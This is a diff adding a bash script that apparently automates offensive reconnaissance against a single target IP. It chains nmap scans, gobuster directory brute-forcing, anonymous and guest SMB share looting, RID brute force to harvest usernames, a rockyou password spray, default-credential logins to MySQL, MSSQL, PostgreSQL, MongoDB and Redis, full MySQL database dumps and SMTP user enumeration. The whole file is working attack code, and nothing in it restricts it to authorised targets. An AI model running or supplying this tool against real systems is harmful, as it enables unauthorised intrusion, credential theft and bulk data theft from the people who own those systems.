@@ -1,0 +1,700 @@
+#!/bin/bash
+#
+# This script helps to uncover basic information on a target and automatically download anything avalible in anonymous/guest access shares/services. 
+#
+#==============================================================================
+# COLOR DEFINITIONS
+#==============================================================================
+GREEN='\e[32m'
+YELLOW='\e[33m'
+RED='\e[31m'
+CYAN='\e[36m'
+RESET='\e[0m'
+BOLD='\e[1m'
+
+#==============================================================================
+# START TIMER
+#==============================================================================
+START_TIME=$SECONDS
+
+#==============================================================================
+# CAPTURE TARGET IP
+#==============================================================================
+TARGET=$1
+
+#==============================================================================
+# INPUT VALIDATION
+#==============================================================================
+if [ -z "$TARGET" ]; then
+    echo -e "${RED}Usage: $0 <target_ip>${RESET}"
+    exit 1
+fi
+
+echo -e "${CYAN}Scanning $TARGET${RESET}"
+
+#==============================================================================
+# PHASE 1: FAST PORT DISCOVERY
+#==============================================================================
+if [ -f "portscan.txt" ]; then
+    echo -e "${YELLOW}Using existing portscan.txt${RESET}"
+else
+    sudo nmap -T4 -sS -p- --min-rate=10000 --open -oG portscan.txt $TARGET > /dev/null 2>&1
+fi
+
+OPEN_PORTS=$(grep -oP '\d+/open' portscan.txt | cut -d '/' -f 1 | paste -sd,)
+
+if [ -z "$OPEN_PORTS" ]; then
+    echo -e "${RED}No open ports found. Exiting.${RESET}"
+    exit 1
+fi
+
+echo -e "${BOLD}${GREEN}Found ports: $OPEN_PORTS${RESET}"
+
+#==============================================================================
+# PHASE 2: DETAILED SCAN
+#==============================================================================
+if [ -f "${TARGET}_detailed.txt" ]; then
+    echo -e "${YELLOW}Using existing ${TARGET}_detailed.txt${RESET}"
+else
+    echo -e "${YELLOW}Running detailed scan...${RESET}"
+    sudo nmap -Pn -T4 -sV -sC -O -p $OPEN_PORTS $TARGET -oN ${TARGET}_detailed.txt > /dev/null 2>&1
+fi
+
+#==============================================================================
+# EXTRACT HOSTNAME AND UPDATE /etc/hosts (CRITICAL - BEFORE WEB ENUM)
+#==============================================================================
+HOSTNAME=$(awk '/Host:/ {gsub(/[;,:]$/,"",$2); print $2; exit}' ${TARGET}_detailed.txt)
+
+if [ ! -z "$HOSTNAME" ]; then
+    echo ""
+    echo -e "${CYAN}${BOLD}==================================================================${RESET}"
+    echo -e "${GREEN}${BOLD}Found hostname: $HOSTNAME${RESET}"
+    echo -e "${CYAN}${BOLD}==================================================================${RESET}"
+
+    # Check if already in /etc/hosts
+    if grep -q "$TARGET.*$HOSTNAME" /etc/hosts; then
+        echo -e "${GREEN}✓ /etc/hosts already contains: $TARGET    $HOSTNAME${RESET}"
+    else
+        # Remove any old entries for this IP and add new one
+        sudo sed -i "/^$TARGET/d" /etc/hosts 2>/dev/null
+        echo "$TARGET    $HOSTNAME" | sudo tee -a /etc/hosts > /dev/null
+
+        if grep -q "$TARGET.*$HOSTNAME" /etc/hosts; then
+            echo -e "${GREEN}${BOLD}✓ Successfully added to /etc/hosts: $TARGET    $HOSTNAME${RESET}"
+        else
+            echo -e "${RED}✗ Failed to add to /etc/hosts${RESET}"
+        fi
+    fi
+    echo ""
+fi
+
+#==============================================================================
+# DETECT OS TYPE
+#==============================================================================
+IS_LINUX=false
+if grep -qi "linux" ${TARGET}_detailed.txt; then
+    IS_LINUX=true
+    echo -e "${GREEN}Target detected as Linux${RESET}"
+fi
+
+#==============================================================================
+# DISPLAY SCAN SUMMARY
+#==============================================================================
+echo ""
+echo -e "${CYAN}${BOLD}==================================================================${RESET}"
+echo -e "${CYAN}${BOLD}                    SCAN SUMMARY                                  ${RESET}"
+echo -e "${CYAN}${BOLD}==================================================================${RESET}"
+
+# Display OS Information
+OS_INFO=$(grep -i "OS details:" ${TARGET}_detailed.txt | sed 's/|.*OS details: //' | head -1)
+if [ -z "$OS_INFO" ]; then
+    OS_INFO=$(grep "Aggressive OS guesses:" ${TARGET}_detailed.txt -A1 | tail -1 | sed 's/|//' | awk '{$1=$1};1')
+fi
+
+if [ ! -z "$OS_INFO" ]; then
+    echo -e "${YELLOW}Operating System:${RESET} $OS_INFO"
+else
+    echo -e "${YELLOW}Operating System:${RESET} Unknown"
+fi
+
+if [ ! -z "$HOSTNAME" ]; then
+    echo -e "${YELLOW}Hostname:${RESET} $HOSTNAME"
+fi
+
+echo ""
+echo -e "${CYAN}Open Ports and Services:${RESET}"
+echo -e "${BOLD}PORT      STATE    SERVICE         VERSION${RESET}"
+echo "=================================================================="
+
+# Parse nmap output for port/service/version info
+grep "^[0-9]*/tcp.*open" ${TARGET}_detailed.txt | while read line; do
+    PORT=$(echo $line | awk '{print $1}' | cut -d'/' -f1)
+    SERVICE=$(echo $line | awk '{print $3}')
+    VERSION=$(echo $line | cut -d' ' -f4- | head -c 40)
+
+    printf "%-9s %-8s %-15s %s\n" "$PORT" "open" "$SERVICE" "$VERSION"
+done
+
+echo "=================================================================="
+echo ""
+
+#==============================================================================
+# PHASE 3: WEB ENUMERATION (BACKGROUND, FULLY SILENT)
+#==============================================================================
+GOBUSTER_RUNNING=false
+
+# Prepare custom wordlist (combine harvested dirs + raftm)
+CUSTOM_WORDLIST="/tmp/autorecon_wordlist_$$.txt"
+if [ -f ~/Desktop/found_dirs.txt ] && [ -s ~/Desktop/found_dirs.txt ]; then
+    CUSTOM_COUNT=$(wc -l < ~/Desktop/found_dirs.txt)
+    echo -e "${GREEN}Using harvested wordlist: $CUSTOM_COUNT directories${RESET}"
+    cat ~/Desktop/found_dirs.txt > $CUSTOM_WORDLIST
+    cat /home/$USER/wordlists/raftm.txt >> $CUSTOM_WORDLIST
+else
+    cat /home/$USER/wordlists/raftm.txt > $CUSTOM_WORDLIST
+fi
+
+if echo "$OPEN_PORTS" | grep -q "\b80\b"; then
+    if [ -f "${TARGET}_gobuster_80.txt" ]; then
+        echo -e "${YELLOW}Port 80: Using existing ${TARGET}_gobuster_80.txt${RESET}"
+    else
+        echo -e "${CYAN}Port 80 detected - Starting directory enumeration${RESET}"
+
+        if [ ! -z "$HOSTNAME" ]; then
+            WEB_TARGET="http://$HOSTNAME"
+        else
+            WEB_TARGET="http://$TARGET"
+        fi
+
+        # Fully silent - no terminal output during background run
+        gobuster dir -u "$WEB_TARGET" -w $CUSTOM_WORDLIST -x php,txt,html,zip,bak -q -o ${TARGET}_gobuster_80.txt > /dev/null 2>&1 &
+
+        GOBUSTER_PID_80=$!
+        echo -e "${GREEN}Gobuster started (PID: $GOBUSTER_PID_80) → ${TARGET}_gobuster_80.txt${RESET}"
+        GOBUSTER_RUNNING=true
+    fi
+fi
+
+if echo "$OPEN_PORTS" | grep -q "\b443\b"; then
+    if [ -f "${TARGET}_gobuster_443.txt" ]; then
+        echo -e "${YELLOW}Port 443: Using existing ${TARGET}_gobuster_443.txt${RESET}"
+    else
+        echo -e "${CYAN}Port 443 detected - Starting directory enumeration${RESET}"
+
+        if [ ! -z "$HOSTNAME" ]; then
+            WEB_TARGET="https://$HOSTNAME"
+        else
+            WEB_TARGET="https://$TARGET"
+        fi
+
+        # Fully silent - no terminal output during background run
+        gobuster dir -u "$WEB_TARGET" -w $CUSTOM_WORDLIST -x php,txt,html,zip,bak -k -q -o ${TARGET}_gobuster_443.txt > /dev/null 2>&1 &
+
+        GOBUSTER_PID_443=$!
+        echo -e "${GREEN}Gobuster started (PID: $GOBUSTER_PID_443) → ${TARGET}_gobuster_443.txt${RESET}"
+        GOBUSTER_RUNNING=true
+    fi
+fi
+
+#==============================================================================
+# PHASE 4: SMB ENUMERATION
+#==============================================================================
+if echo "$OPEN_PORTS" | grep -q "\b445\b"; then
+    echo -e "${CYAN}Port 445 detected - Starting SMB enumeration${RESET}"
+    
+    SMB_OUTPUT="${TARGET}_smb_enum.txt"
+    
+    if [ -f "$SMB_OUTPUT" ]; then
+        echo -e "${YELLOW}Using existing $SMB_OUTPUT${RESET}"
+        
+        # Still need to check access for later operations
+        if grep -q "\[+\].*:" $SMB_OUTPUT | head -1; then
+            ANON_ACCESS=true
+            SMB_CREDS="-N"
+        elif grep -q "\[+\].*guest" $SMB_OUTPUT; then
+            GUEST_ACCESS=true
+            SMB_CREDS="-U guest%''"
+        fi
+    else
+        # Test anonymous access
+        nxc smb $TARGET -u '' -p '' --shares > $SMB_OUTPUT 2>&1
+        
+        if grep -q "\[+\]" $SMB_OUTPUT; then
+            echo -e "${GREEN}Anonymous access successful${RESET}"
+            echo -e "${GREEN}${BOLD}→ nxc smb $TARGET -u '' -p '' --shares${RESET}"
+            echo -e "${GREEN}${BOLD}→ smbclient //$TARGET/\[SHARE\] -N${RESET}"
+            ANON_ACCESS=true
+            SMB_CREDS="-N"
+        else
+            ANON_ACCESS=false
+            
+            # Try guest access
+            nxc smb $TARGET -u 'guest' -p '' --shares >> $SMB_OUTPUT 2>&1
+            
+            if grep -q "\[+\]" $SMB_OUTPUT; then
+                echo -e "${GREEN}Guest access successful${RESET}"
+                echo -e "${GREEN}${BOLD}→ nxc smb $TARGET -u 'guest' -p '' --shares${RESET}"
+                echo -e "${GREEN}${BOLD}→ smbclient //$TARGET/[SHARE] -U guest%''${RESET}"
+                GUEST_ACCESS=true
+                SMB_CREDS="-U guest%''"
+            else
+                echo -e "${RED}No anonymous/guest access${RESET}"
+                GUEST_ACCESS=false
+            fi
+        fi
+    fi
+    
+    # Extract and enumerate shares
+    if [ "$ANON_ACCESS" = true ] || [ "$GUEST_ACCESS" = true ]; then
+        SHARES=$(awk '/READ/ && $5 !~ /IPC|print/ {print $5}' $SMB_OUTPUT | sort -u)
+        
+        if [ ! -z "$SHARES" ]; then
+            echo -e "${GREEN}Found readable shares: $SHARES${RESET}"
+
+            # Create download directory
+            SMB_CONTENT_DIR="smb_content"
+            mkdir -p $SMB_CONTENT_DIR
+
+            # Enumerate shares in parallel
+            declare -a ENUM_PIDS
+            for SHARE in $SHARES; do
+                SHARE_FILE="${TARGET}_share_${SHARE}.txt"
+
+                if [ -f "$SHARE_FILE" ]; then
+                    echo -e "${YELLOW}Using existing $SHARE_FILE${RESET}"
+                else
+                    # List contents in background
+                    (smbclient //$TARGET/$SHARE $SMB_CREDS -c "recurse; ls" > $SHARE_FILE 2>&1 && \
+                     echo -e "${GREEN}Enumerated: $SHARE → $SHARE_FILE${RESET}") &
+                    ENUM_PIDS+=($!)
+                fi
+            done
+
+            # Wait for all enumeration to complete
+            if [ ${#ENUM_PIDS[@]} -gt 0 ]; then
+                echo -e "${YELLOW}Waiting for ${#ENUM_PIDS[@]} share enumeration tasks...${RESET}"
+                wait "${ENUM_PIDS[@]}"
+                echo -e "${GREEN}All share enumeration complete${RESET}"
+            fi
+
+            # Display and download shares
+            for SHARE in $SHARES; do
+                SHARE_FILE="${TARGET}_share_${SHARE}.txt"
+
+                # Show exact command for this share
+                if [ "$ANON_ACCESS" = true ]; then
+                    echo -e "${GREEN}${BOLD}→ smbclient //$TARGET/$SHARE -N${RESET}"
+                else
+                    echo -e "${GREEN}${BOLD}→ smbclient //$TARGET/$SHARE -U guest%''${RESET}"
+                fi
+
+                # Display files found
+                echo -e "${CYAN}Files in $SHARE:${RESET}"
+                awk '/^\s+[A-Za-z0-9]/ && !/blocks of size|blocks available/ {print "  - " $1}' $SHARE_FILE | head -20
+
+                # Download all files from share
+                if [ -d "$SMB_CONTENT_DIR/$SHARE" ] && [ "$(ls -A $SMB_CONTENT_DIR/$SHARE 2>/dev/null)" ]; then
+                    DOWNLOADED=$(find $SMB_CONTENT_DIR/$SHARE -type f | wc -l)
+                    echo -e "${YELLOW}Using existing downloads: $DOWNLOADED files in $SMB_CONTENT_DIR/$SHARE/${RESET}"
+                else
+                    echo -e "${YELLOW}Downloading files from $SHARE...${RESET}"
+
+                    mkdir -p $SMB_CONTENT_DIR/$SHARE
+                    cd $SMB_CONTENT_DIR/$SHARE
+
+                    smbclient //$TARGET/$SHARE $SMB_CREDS -c "prompt OFF; recurse ON; mget *" 2>&1 | grep -v "getting file"
+
+                    cd - > /dev/null
+
+                    # Reuse the same find result
+                    DOWNLOADED=$(find $SMB_CONTENT_DIR/$SHARE -type f 2>/dev/null | wc -l)
+                    echo -e "${GREEN}Downloaded $DOWNLOADED files to $SMB_CONTENT_DIR/$SHARE/${RESET}"
+                fi
+                echo ""
+            done
+        fi
+        
+        # RID brute force (run in background)
+        if [ -f "${TARGET}_rid_brute.txt" ]; then
+            echo -e "${YELLOW}Using existing ${TARGET}_rid_brute.txt${RESET}"
+        else
+            echo -e "${YELLOW}Running RID brute force...${RESET}"
+
+            if [ "$ANON_ACCESS" = true ]; then
+                nxc smb $TARGET -u '' -p '' --rid-brute 3000 > ${TARGET}_rid_brute.txt 2>&1
+            else
+                nxc smb $TARGET -u 'guest' -p '' --rid-brute 3000 > ${TARGET}_rid_brute.txt 2>&1
+            fi
+            echo -e "${GREEN}RID brute force complete${RESET}"
+        fi
+
+        # Extract usernames
+        awk -F'[\\\\ ]' '/SidTypeUser/ && !/\$/ {print $2}' ${TARGET}_rid_brute.txt | sort -u > ${TARGET}_usernames.txt
+        
+        USER_COUNT=$(wc -l < ${TARGET}_usernames.txt)
+        
+        if [ $USER_COUNT -gt 0 ]; then
+            echo -e "${GREEN}Found $USER_COUNT usernames → ${TARGET}_usernames.txt${RESET}"
+            
+            if [ -f "${TARGET}_password_spray.txt" ]; then
+                echo -e "${YELLOW}Using existing ${TARGET}_password_spray.txt${RESET}"
+            else
+                # Password spray with timeout and limited wordlist
+                echo -e "${YELLOW}Starting password spray (30 minute timeout, limited wordlist)...${RESET}"
+
+                # Use first 10000 passwords from rockyou for faster execution
+                timeout 30m nxc smb $TARGET \
+                    -u ${TARGET}_usernames.txt \
+                    -p <(head -n 10000 /home/$USER/wordlists/rockyou.txt) \
+                    --continue-on-success \
+                    --no-bruteforce > ${TARGET}_password_spray.txt 2>&1
+
+                # Check if timeout occurred
+                if [ $? -eq 124 ]; then
+                    echo -e "${RED}Password spray timed out after 30 minutes${RESET}"
+                fi
+            fi
+            
+            # Extract valid creds
+            grep "\[+\]" ${TARGET}_password_spray.txt > ${TARGET}_valid_creds.txt 2>/dev/null
+            
+            CRED_COUNT=$(wc -l < ${TARGET}_valid_creds.txt 2>/dev/null || echo 0)
+            
+            if [ $CRED_COUNT -gt 0 ]; then
+                echo -e "${GREEN}${BOLD}Found $CRED_COUNT valid credentials!${RESET}"
+                cat ${TARGET}_valid_creds.txt
+            fi
+        fi
+    fi
+fi
+
+#==============================================================================
+# PHASE 5: FTP ENUMERATION
+#==============================================================================
+if echo "$OPEN_PORTS" | grep -q "\b21\b"; then
+    echo -e "${CYAN}Port 21 detected - Starting FTP enumeration${RESET}"
+
+    FTP_OUTPUT="${TARGET}_ftp_enum.txt"
+
+    if [ -f "$FTP_OUTPUT" ]; then
+        echo -e "${YELLOW}Using existing $FTP_OUTPUT${RESET}"
+    else
+        # Test anonymous FTP access
+        echo -e "${YELLOW}Testing anonymous FTP access...${RESET}"
+
+        ftp -n $TARGET <<EOF > $FTP_OUTPUT 2>&1
+quote USER anonymous
+quote PASS anonymous
+ls -la
+bye
+EOF
+
+        if grep -q "230" $FTP_OUTPUT; then
+            echo -e "${GREEN}Anonymous FTP access successful${RESET}"
+            echo -e "${GREEN}${BOLD}→ ftp anonymous@$TARGET${RESET}"
+            echo -e "${GREEN}${BOLD}→ wget -r ftp://anonymous:anonymous@$TARGET/${RESET}"
+
+            # Create FTP download directory
+            FTP_DIR="ftp_content"
+            mkdir -p $FTP_DIR
+
+            # Download all files recursively
+            echo -e "${YELLOW}Downloading FTP contents...${RESET}"
+            wget -r -nH --no-parent --reject="index.html*" ftp://anonymous:anonymous@$TARGET/ -P $FTP_DIR > /dev/null 2>&1
+
+            DOWNLOADED=$(find $FTP_DIR -type f 2>/dev/null | wc -l)
+            echo -e "${GREEN}Downloaded $DOWNLOADED files to $FTP_DIR/${RESET}"
+        else
+            echo -e "${RED}No anonymous FTP access${RESET}"
+        fi
+    fi
+fi
+
+#==============================================================================
+# PHASE 6: MYSQL ENUMERATION
+#==============================================================================
+if echo "$OPEN_PORTS" | grep -q "\b3306\b"; then
+    echo -e "${CYAN}Port 3306 detected - Starting MySQL enumeration${RESET}"
+
+    MYSQL_OUTPUT="${TARGET}_mysql_enum.txt"
+
+    if [ -f "$MYSQL_OUTPUT" ]; then
+        echo -e "${YELLOW}Using existing $MYSQL_OUTPUT${RESET}"
+    else
+        echo -e "${YELLOW}Testing MySQL anonymous access...${RESET}"
+
+        # Test various default credentials
+        MYSQL_CREDS=("root:" "root:root" "root:toor" "admin:admin" "mysql:mysql")
+        MYSQL_ACCESS=false
+
+        for CRED in "${MYSQL_CREDS[@]}"; do
+            USER=$(echo $CRED | cut -d':' -f1)
+            PASS=$(echo $CRED | cut -d':' -f2)
+
+            if [ -z "$PASS" ]; then
+                mysql -h $TARGET -u $USER -e "SHOW DATABASES;" > $MYSQL_OUTPUT 2>&1
+            else
+                mysql -h $TARGET -u $USER -p$PASS -e "SHOW DATABASES;" > $MYSQL_OUTPUT 2>&1
+            fi
+
+            if [ $? -eq 0 ]; then
+                echo -e "${GREEN}MySQL access successful with $USER:$PASS${RESET}"
+                if [ -z "$PASS" ]; then
+                    echo -e "${GREEN}${BOLD}→ mysql -h $TARGET -u $USER${RESET}"
+                else
+                    echo -e "${GREEN}${BOLD}→ mysql -h $TARGET -u $USER -p$PASS${RESET}"
+                fi
+                MYSQL_ACCESS=true
+                MYSQL_USER=$USER
+                MYSQL_PASS=$PASS
+                break
+            fi
+        done
+
+        if [ "$MYSQL_ACCESS" = true ]; then
+            # Enumerate databases
+            echo -e "${YELLOW}Enumerating MySQL databases...${RESET}"
+
+            if [ -z "$MYSQL_PASS" ]; then
+                mysql -h $TARGET -u $MYSQL_USER -e "SHOW DATABASES;" | grep -v "Database\|information_schema\|performance_schema\|mysql\|sys" > ${TARGET}_mysql_databases.txt
+            else
+                mysql -h $TARGET -u $MYSQL_USER -p$MYSQL_PASS -e "SHOW DATABASES;" | grep -v "Database\|information_schema\|performance_schema\|mysql\|sys" > ${TARGET}_mysql_databases.txt
+            fi
+
+            DB_COUNT=$(wc -l < ${TARGET}_mysql_databases.txt)
+            echo -e "${GREEN}Found $DB_COUNT databases${RESET}"
+
+            # Dump all databases
+            if [ $DB_COUNT -gt 0 ]; then
+                echo -e "${CYAN}Database access commands:${RESET}"
+                while read DB; do
+                    if [ -z "$MYSQL_PASS" ]; then
+                        echo -e "${GREEN}${BOLD}→ mysql -h $TARGET -u $MYSQL_USER -D $DB${RESET}"
+                    else
+                        echo -e "${GREEN}${BOLD}→ mysql -h $TARGET -u $MYSQL_USER -p$MYSQL_PASS -D $DB${RESET}"
+                    fi
+                done < ${TARGET}_mysql_databases.txt
+                echo ""
+                MYSQL_DUMP_DIR="mysql_dumps"
+                mkdir -p $MYSQL_DUMP_DIR
+
+                echo -e "${YELLOW}Dumping MySQL databases...${RESET}"
+
+                while read DB; do
+                    if [ -z "$MYSQL_PASS" ]; then
+                        mysqldump -h $TARGET -u $MYSQL_USER $DB > $MYSQL_DUMP_DIR/${DB}.sql 2>/dev/null
+                    else
+                        mysqldump -h $TARGET -u $MYSQL_USER -p$MYSQL_PASS $DB > $MYSQL_DUMP_DIR/${DB}.sql 2>/dev/null
+                    fi
+                    echo -e "${GREEN}Dumped database: $DB${RESET}"
+                done < ${TARGET}_mysql_databases.txt
+            fi
+        else
+            echo -e "${RED}No MySQL access with default credentials${RESET}"
+        fi
+    fi
+fi
+
+#==============================================================================
+# PHASE 7: MSSQL ENUMERATION
+#==============================================================================
+if echo "$OPEN_PORTS" | grep -q "\b1433\b"; then
+    echo -e "${CYAN}Port 1433 detected - Starting MSSQL enumeration${RESET}"
+
+    MSSQL_OUTPUT="${TARGET}_mssql_enum.txt"
+
+    if [ -f "$MSSQL_OUTPUT" ]; then
+        echo -e "${YELLOW}Using existing $MSSQL_OUTPUT${RESET}"
+    else
+        echo -e "${YELLOW}Testing MSSQL access with nxc...${RESET}"
+
+        nxc mssql $TARGET -u '' -p '' --local-auth > $MSSQL_OUTPUT 2>&1
+
+        if grep -q "\[+\]" $MSSQL_OUTPUT; then
+            echo -e "${GREEN}MSSQL anonymous access successful${RESET}"
+            echo -e "${GREEN}${BOLD}→ nxc mssql $TARGET -u '' -p '' --local-auth${RESET}"
+
+            # Enumerate databases
+            nxc mssql $TARGET -u '' -p '' --local-auth -q "SELECT name FROM master.sys.databases" >> $MSSQL_OUTPUT 2>&1
+        else
+            # Try common credentials
+            nxc mssql $TARGET -u 'sa' -p '' --local-auth > $MSSQL_OUTPUT 2>&1
+            nxc mssql $TARGET -u 'sa' -p 'sa' --local-auth >> $MSSQL_OUTPUT 2>&1
+
+            if grep -q "\[+\]" $MSSQL_OUTPUT; then
+                echo -e "${GREEN}MSSQL access with default credentials${RESET}"
+                echo -e "${GREEN}${BOLD}→ nxc mssql $TARGET -u 'sa' -p '' --local-auth${RESET}"
+            else
+                echo -e "${RED}No MSSQL access${RESET}"
+            fi
+        fi
+    fi
+fi
+
+#==============================================================================
+# PHASE 8: POSTGRESQL ENUMERATION
+#==============================================================================
+if echo "$OPEN_PORTS" | grep -q "\b5432\b"; then
+    echo -e "${CYAN}Port 5432 detected - Starting PostgreSQL enumeration${RESET}"
+
+    PGSQL_OUTPUT="${TARGET}_pgsql_enum.txt"
+
+    if [ -f "$PGSQL_OUTPUT" ]; then
+        echo -e "${YELLOW}Using existing $PGSQL_OUTPUT${RESET}"
+    else
+        echo -e "${YELLOW}Testing PostgreSQL access...${RESET}"
+
+        # Test common credentials
+        PGPASSWORD='' psql -h $TARGET -U postgres -c "\l" > $PGSQL_OUTPUT 2>&1
+
+        if [ $? -eq 0 ]; then
+            echo -e "${GREEN}PostgreSQL access successful${RESET}"
+            echo -e "${GREEN}${BOLD}→ psql -h $TARGET -U postgres${RESET}"
+        else
+            echo -e "${RED}No PostgreSQL access${RESET}"
+        fi
+    fi
+fi
+
+#==============================================================================
+# PHASE 9: MONGODB ENUMERATION
+#==============================================================================
+if echo "$OPEN_PORTS" | grep -q "\b27017\b"; then
+    echo -e "${CYAN}Port 27017 detected - Starting MongoDB enumeration${RESET}"
+
+    MONGO_OUTPUT="${TARGET}_mongo_enum.txt"
+
+    if [ -f "$MONGO_OUTPUT" ]; then
+        echo -e "${YELLOW}Using existing $MONGO_OUTPUT${RESET}"
+    else
+        echo -e "${YELLOW}Testing MongoDB unauthenticated access...${RESET}"
+
+        mongosh --host $TARGET --quiet --eval "db.adminCommand('listDatabases')" > $MONGO_OUTPUT 2>&1
+
+        if [ $? -eq 0 ]; then
+            echo -e "${GREEN}MongoDB unauthenticated access successful${RESET}"
+            echo -e "${GREEN}${BOLD}→ mongosh --host $TARGET${RESET}"
+
+            # List databases
+            mongosh --host $TARGET --quiet --eval "db.adminCommand('listDatabases').databases.forEach(function(d){print(d.name)})" | grep -v "admin\|config\|local" > ${TARGET}_mongo_databases.txt
+
+            DB_COUNT=$(wc -l < ${TARGET}_mongo_databases.txt)
+            echo -e "${GREEN}Found $DB_COUNT databases${RESET}"
+
+            # Show commands for each database
+            if [ $DB_COUNT -gt 0 ]; then
+                echo -e "${CYAN}Database access commands:${RESET}"
+                while read DB; do
+                    echo -e "${GREEN}${BOLD}→ mongosh --host $TARGET --eval 'use $DB'${RESET}"
+                done < ${TARGET}_mongo_databases.txt
+            fi
+        else
+            echo -e "${RED}No MongoDB unauthenticated access${RESET}"
+        fi
+    fi
+fi
+
+#==============================================================================
+# PHASE 10: REDIS ENUMERATION
+#==============================================================================
+if echo "$OPEN_PORTS" | grep -q "\b6379\b"; then
+    echo -e "${CYAN}Port 6379 detected - Starting Redis enumeration${RESET}"
+
+    REDIS_OUTPUT="${TARGET}_redis_enum.txt"
+
+    if [ -f "$REDIS_OUTPUT" ]; then
+        echo -e "${YELLOW}Using existing $REDIS_OUTPUT${RESET}"
+    else
+        echo -e "${YELLOW}Testing Redis unauthenticated access...${RESET}"
+
+        redis-cli -h $TARGET INFO > $REDIS_OUTPUT 2>&1
+
+        if [ $? -eq 0 ] && ! grep -q "NOAUTH" $REDIS_OUTPUT; then
+            echo -e "${GREEN}Redis unauthenticated access successful${RESET}"
+            echo -e "${GREEN}${BOLD}→ redis-cli -h $TARGET${RESET}"
+
+            # Get all keys
+            redis-cli -h $TARGET KEYS '*' > ${TARGET}_redis_keys.txt 2>&1
+            KEY_COUNT=$(wc -l < ${TARGET}_redis_keys.txt)
+            echo -e "${GREEN}Found $KEY_COUNT keys${RESET}"
+        else
+            echo -e "${RED}No Redis unauthenticated access${RESET}"
+        fi
+    fi
+fi
+
+#==============================================================================
+# PHASE 11: SMTP USER ENUMERATION
+#==============================================================================
+if echo "$OPEN_PORTS" | grep -q "\b25\b"; then
+    echo -e "${CYAN}Port 25 detected - Starting SMTP enumeration${RESET}"
+
+    SMTP_OUTPUT="${TARGET}_smtp_enum.txt"
+
+    if [ -f "$SMTP_OUTPUT" ]; then
+        echo -e "${YELLOW}Using existing $SMTP_OUTPUT${RESET}"
+    else
+        echo -e "${YELLOW}Testing SMTP user enumeration...${RESET}"
+
+        # Use smtp-user-enum if available
+        if command -v smtp-user-enum &> /dev/null; then
+            smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $TARGET > $SMTP_OUTPUT 2>&1
+
+            if grep -q "exists" $SMTP_OUTPUT; then
+                echo -e "${GREEN}SMTP user enumeration successful${RESET}"
+            else
+                echo -e "${YELLOW}No users found via SMTP${RESET}"
+            fi
+        else
+            echo -e "${YELLOW}smtp-user-enum not installed, skipping${RESET}"
+        fi
+    fi
+fi
+
+#==============================================================================
+# CALCULATE TOTAL TIME
+#==============================================================================
+END_TIME=$SECONDS
+ELAPSED=$((END_TIME - START_TIME))
+MINUTES=$((ELAPSED / 60))
+SECONDS_REMAINING=$((ELAPSED % 60))
+
+echo ""
+echo -e "${GREEN}${BOLD}Reconnaissance complete! ${RESET}${YELLOW}(${MINUTES}m ${SECONDS_REMAINING}s)${RESET}"
+
+#==============================================================================
+# BRING GOBUSTER TO FOREGROUND
+#==============================================================================
+if [ "$GOBUSTER_RUNNING" = true ]; then
+    echo ""
+    echo -e "${CYAN}==================================================================${RESET}"
+    echo -e "${CYAN}Waiting for gobuster to complete - Press Ctrl+C to stop${RESET}"
+    echo -e "${CYAN}==================================================================${RESET}"
+    sleep 2
+
+    # Show live gobuster output
+    if [ ! -z "$GOBUSTER_PID_80" ] && kill -0 $GOBUSTER_PID_80 2>/dev/null; then
+        echo -e "${YELLOW}Showing port 80 gobuster output (Press Ctrl+C to stop)...${RESET}"
+        echo ""
+
+        # Tail the output file and wait for process
+        tail -f ${TARGET}_gobuster_80.txt --pid=$GOBUSTER_PID_80 2>/dev/null
+
+        echo ""
+        echo -e "${GREEN}Port 80 gobuster complete${RESET}"
+    fi
+
+    if [ ! -z "$GOBUSTER_PID_443" ] && kill -0 $GOBUSTER_PID_443 2>/dev/null; then
+        echo -e "${YELLOW}Showing port 443 gobuster output (Press Ctrl+C to stop)...${RESET}"
+        echo ""
+
+        # Tail the output file and wait for process
+        tail -f ${TARGET}_gobuster_443.txt --pid=$GOBUSTER_PID_443 2>/dev/null
+
+        echo ""
+        echo -e "${GREEN}Port 443 gobuster complete${RESET}"
+    fi
+fi
+
+# Cleanup temporary wordlist
+rm -f $CUSTOM_WORDLIST 2>/dev/null
